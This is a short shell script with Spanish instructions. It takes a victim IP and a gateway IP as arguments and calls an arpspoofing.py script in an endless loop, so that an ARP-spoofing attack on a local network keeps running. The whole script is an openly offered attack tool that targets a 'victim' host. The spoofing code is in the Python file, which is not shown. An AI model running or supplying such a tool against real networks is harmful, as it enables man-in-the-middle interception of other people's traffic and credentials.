echo "Ejecuta el programa de la siguiente manera poniendo como primer argumento la ip victima y como segundo la ip de la puerta de enlace o gateway de su red: sudo ./arpspoofingcontinued.sh 192.168.0.10 192.168.1.1"
while true
do
	python arpspoofing.py $1 $2
done
